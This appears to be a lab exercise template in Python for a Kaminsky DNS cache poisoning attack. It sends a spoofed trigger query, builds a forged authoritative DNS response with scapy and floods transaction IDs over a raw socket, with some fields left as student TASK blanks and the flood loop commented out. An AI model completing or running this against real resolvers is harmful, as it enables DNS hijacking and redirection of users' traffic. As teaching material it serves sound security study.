import os
import sys
import struct
import socket
import random
import string

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
if PARENT_DIR not in sys.path:
    sys.path.insert(0, PARENT_DIR)

from scapy.all import *
from common_library import *

print("[*] 1. Leaking resolver TXID/port via controlled domain...")
leaked_txid, target_port = sniff_port_and_txid(5)

# [TASK 1] Cache Evasion (The random subdomain)
# HINT: Kaminsky requires querying a random, non-existent subdomain to bypass the cache.
# Generate a 5-character random string and append ".example.com"
print("[*] 2. Generating random subdomain for cache evasion...")
random_prefix = None # <-- REPLACE THIS
domain = None # <-- REPLACE THIS

print("[*] 3. Sending trigger query for {}...".format(domain))
trigger = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
send(trigger, verbose=0)

# [TASK 2] The Poisonous Payload (Zone Hijacking & Glue Record)
print("[*] 4. Building the spoofed Kaminsky responses...")
# HINT: The answer section is for the random subdomain.
# The real poison goes in the AUTHORITY (NS record) and ADDITIONAL (A record) sections.
base_pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src=example_auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(id=0, qr=1, aa=1, 
        qd=DNSQR(qname=domain),
        # ANSWER: Legitimate-looking response for the random subdomain
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata=fake_ip),
        
        # [TASK 2.1] Delegate the entire auth zone to the attacker dnserver
        # ns=DNSRR(rrname= ??? , type= ??? , ttl=86400, rdata= ??? ),
        
        # [TASK 2.2] Glue record mapping attacker DNS to our malicious IP (attacker_auth_dns)
        # ar=DNSRR(rrname= ??? , type= ??? , ttl=86400, rdata= ??? )
    )
)

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("eth0", 0))

# [TASK 3] The TXID Brute-Force Flood
print("[*] 5. Flooding spoofed responses across all TXIDs on port {}...".format(target_port))
# HINT: Brute-force the entire 16-bit TXID space to win the race condition. 
MAX_TXID = 0 # <-- REPLACE THIS

# Uncomment the loop to execute the flood
# for txid in range(0, MAX_TXID):
#     struct.pack_into('!H', raw_bytes, 42, txid)
#     s.send(raw_bytes)

print("[+] Kaminsky flood complete for {}!".format(domain))

# Verification (Pre-filled)
print("[*] 6. Verifying cache poisoning...")
verification = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
ans = sr1(verification, timeout=3, verbose=0)

if ans and ans.haslayer(DNS) and ans[DNS].an:
    print("[+] Verification SUCCESS! {} resolves to {}".format(domain, ans[DNS].an.rdata))
    print("[+] Now check the real authority with: dig @{} example.com NS".format(target_dns))
else:
    print("[-] Verification FAILED or timed out.")